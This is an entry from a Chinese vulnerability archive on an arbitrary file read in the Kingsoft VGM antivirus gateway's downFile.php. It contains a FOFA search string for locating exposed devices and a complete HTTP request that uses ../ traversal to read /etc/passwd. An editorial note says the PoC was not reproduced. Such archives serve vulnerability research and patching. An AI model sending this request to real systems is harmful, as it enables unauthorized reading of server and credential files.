---
source: "wy876 漏洞文库"
id: "vw-c593bf69c91aa4ef092da794"
entity_id: "ve-c593bf69c91aa4ef092da794"
schema_version: "1"
fofa_unverified: "金山VGM"
title: "金山 VGM防毒墙downFile存在任意文件读取漏洞"
product: "金山VGM防毒墙"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "带PHPSESSID，Linux文件路径，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8/%E9%87%91%E5%B1%B1VGM%E9%98%B2%E6%AF%92%E5%A2%99downFile%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/rzhl67wobwkxypr0"
source_status: "recorded"
---

# 金山 VGM防毒墙downFile存在任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：金山VGM防毒墙
- 本文讨论：downFile.php filename遍历
- 版本、权限与配置前提：带PHPSESSID，Linux文件路径，版本未知
- 资料类型：网关路径读取请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 与V8控制台downfile名称相似但产品/路径/大小写不同，不能合并
- 无响应与鉴权角色说明，任意读取范围待证
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 实际可读范围、认证与修复待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
金山 VGM防毒墙由金山安全自主研发推出的新一代专业化安全网关产品。采用、多核硬件架构和独特的模块化功能设计理念，金山 VGM防毒墙具有的高性能、高安全、易操作等特性，真正满足用户不断变化的信息安全需求。灵活稳定的架构，金山 VGM防毒墙集成了网络防火墙、状态监测、抗DDoS、防恶意软件、URL过滤、DPI监测等多种安全功能，有效抵御各类病毒和恶意软件对用户网络和业务系统的破坏。金山 VGM防毒墙 downFile.php文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器任意文件。

# 二、影响版本
+ 金山 VGM防毒墙

# 三、资产测绘
+ fofa`"金山VGM"`
+ 特征


# 四、漏洞复现
```http
GET /downFile.php?filename=../../../../etc/passwd HTTP/1.1
Host: 
Cookie: PHPSESSID=74h********************eq3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://fofa.info/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rzhl67wobwkxypr0>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
